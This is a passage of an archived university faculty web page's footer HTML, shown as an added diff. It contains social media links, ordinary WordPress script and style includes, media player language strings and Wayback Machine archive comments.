+                                        <a style="padding: 0px 3px;" href="https://web.archive.org/web/20250907234827/https://www.youtube.com/channel/UC2c1q37bu0CNR5BxYVI74Jg" class="btn btn-default social-icon">
+                                            <img src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/themes/festi/icon/youtube.png">
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a style="padding: 0px 3px;" href="https://web.archive.org/web/20250907234827/https://www.instagram.com/fakultasekonomiunisti/" class="btn btn-default social-icon">
+                                            <img src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/themes/festi/icon/instagram.png">
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a style="padding: 0px 3px;" href="https://web.archive.org/web/20250907234827/https://www.linkedin.com/in/fakultas-ekonomi-unisti-414702198" class="btn btn-default social-icon">
+                                            <img src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/themes/festi/icon/linkedin.png">
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a style="padding: 0px 3px;" href="https://web.archive.org/web/20250907234827/https://vm.tiktok.com/ZSF8fSDK4/" class="btn btn-default social-icon">
+                                            <img src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2024/02/tiktok.png">
+                                        </a>
+                                    </li>
+                                </ul>
+                            </nav>
+                        </div>
+                        <!--/row-->
+                    </div>
+                    <!--/container-->
+                </div>
+            </footer>
+        </div>
+</div>
+<!--<bw_footer_widget>-->
+<link rel="stylesheet" id="mediaelement-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.13-9993131" type="text/css" media="all"/>
+<link rel="stylesheet" id="wp-mediaelement-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=5.4.17" type="text/css" media="all"/>
+<script type="text/javascript">
+    /* <![CDATA[ */
+    var wpcf7 = {
+        "apiSettings": {
+            "root": "https:\/\/web.archive.org\/web\/20250907234827\/https:\/\/festi.unisti.ac.id\/wp-json\/contact-form-7\/v1",
+            "namespace": "contact-form-7\/v1"
+        }
+    };
+    /* ]]> */
+</script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.3.2"></script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/plugins/tabs-responsive/assets/js/tabs-custom.js?ver=5.4.17"></script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/themes/festi/jquery.all.min.js?ver=1.0"></script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/themes/festi/js/jquery-migrate.min.js?ver=1.0"></script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/themes/festi/customs.js?ver=1.0"></script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/themes/festi/js/owl.carousel.min.js?ver=1.0"></script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/themes/festi/script.js?ver=1.0"></script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/themes/festi/search.js?ver=1.0"></script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-includes/js/wp-embed.min.js?ver=5.4.17"></script>
+<script type="text/javascript">
+    var mejsL10n = {
+        "language": "en",
+        "strings": {
+            "mejs.download-file": "Download File",
+            "mejs.install-flash": "You are using a browser that does not have Flash player enabled or installed. Please turn on your Flash player plugin or download the latest version from https:\/\/get.adobe.com\/flashplayer\/",
+            "mejs.fullscreen": "Fullscreen",
+            "mejs.play": "Play",
+            "mejs.pause": "Pause",
+            "mejs.time-slider": "Time Slider",
+            "mejs.time-help-text": "Use Left\/Right Arrow keys to advance one second, Up\/Down arrows to advance ten seconds.",
+            "mejs.live-broadcast": "Live Broadcast",
+            "mejs.volume-help-text": "Use Up\/Down Arrow keys to increase or decrease volume.",
+            "mejs.unmute": "Unmute",
+            "mejs.mute": "Mute",
+            "mejs.volume-slider": "Volume Slider",
+            "mejs.video-player": "Video Player",
+            "mejs.audio-player": "Audio Player",
+            "mejs.captions-subtitles": "Captions\/Subtitles",
+            "mejs.captions-chapters": "Chapters",
+            "mejs.none": "None",
+            "mejs.afrikaans": "Afrikaans",
+            "mejs.albanian": "Albanian",
+            "mejs.arabic": "Arabic",
+            "mejs.belarusian": "Belarusian",
+            "mejs.bulgarian": "Bulgarian",
+            "mejs.catalan": "Catalan",
+            "mejs.chinese": "Chinese",
+            "mejs.chinese-simplified": "Chinese (Simplified)",
+            "mejs.chinese-traditional": "Chinese (Traditional)",
+            "mejs.croatian": "Croatian",
+            "mejs.czech": "Czech",
+            "mejs.danish": "Danish",
+            "mejs.dutch": "Dutch",
+            "mejs.english": "English",
+            "mejs.estonian": "Estonian",
+            "mejs.filipino": "Filipino",
+            "mejs.finnish": "Finnish",
+            "mejs.french": "French",
+            "mejs.galician": "Galician",
+            "mejs.german": "German",
+            "mejs.greek": "Greek",
+            "mejs.haitian-creole": "Haitian Creole",
+            "mejs.hebrew": "Hebrew",
+            "mejs.hindi": "Hindi",
+            "mejs.hungarian": "Hungarian",
+            "mejs.icelandic": "Icelandic",
+            "mejs.indonesian": "Indonesian",
+            "mejs.irish": "Irish",
+            "mejs.italian": "Italian",
+            "mejs.japanese": "Japanese",
+            "mejs.korean": "Korean",
+            "mejs.latvian": "Latvian",
+            "mejs.lithuanian": "Lithuanian",
+            "mejs.macedonian": "Macedonian",
+            "mejs.malay": "Malay",
+            "mejs.maltese": "Maltese",
+            "mejs.norwegian": "Norwegian",
+            "mejs.persian": "Persian",
+            "mejs.polish": "Polish",
+            "mejs.portuguese": "Portuguese",
+            "mejs.romanian": "Romanian",
+            "mejs.russian": "Russian",
+            "mejs.serbian": "Serbian",
+            "mejs.slovak": "Slovak",
+            "mejs.slovenian": "Slovenian",
+            "mejs.spanish": "Spanish",
+            "mejs.swahili": "Swahili",
+            "mejs.swedish": "Swedish",
+            "mejs.tagalog": "Tagalog",
+            "mejs.thai": "Thai",
+            "mejs.turkish": "Turkish",
+            "mejs.ukrainian": "Ukrainian",
+            "mejs.vietnamese": "Vietnamese",
+            "mejs.welsh": "Welsh",
+            "mejs.yiddish": "Yiddish"
+        }
+    };
+</script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=4.2.13-9993131"></script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=5.4.17"></script>
+<script type="text/javascript">
+    /* <![CDATA[ */
+    var _wpmejsSettings = {
+        "pluginPath": "\/wp-includes\/js\/mediaelement\/",
+        "classPrefix": "mejs-",
+        "stretching": "responsive"
+    };
+    /* ]]> */
+</script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-includes/js/mediaelement/wp-mediaelement.min.js?ver=5.4.17"></script>
+<script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-includes/js/mediaelement/renderers/vimeo.min.js?ver=4.2.13-9993131"></script>
+</body></html>
+<!--
+     FILE ARCHIVED ON 23:48:27 Sep 07, 2025 AND RETRIEVED FROM THE
+     INTERNET ARCHIVE ON 19:17:07 Feb 23, 2026.
+     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.
+
+     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
+     SECTION 108(a)(3)).
+-->
+<!--
+playback timings (ms):
+  captures_list: 0.565
+  exclusion.robots: 0.046
+  exclusion.robots.policy: 0.036
+  esindex: 0.01
+  cdx.remote: 34.358
+  LoadShardBlock: 422.478 (3)
+  PetaboxLoader3.datanode: 156.877 (4)
+  PetaboxLoader3.resolve: 437.675 (3)
+  load_resource: 220.267
+  nav: 0.258 (6)
+-->
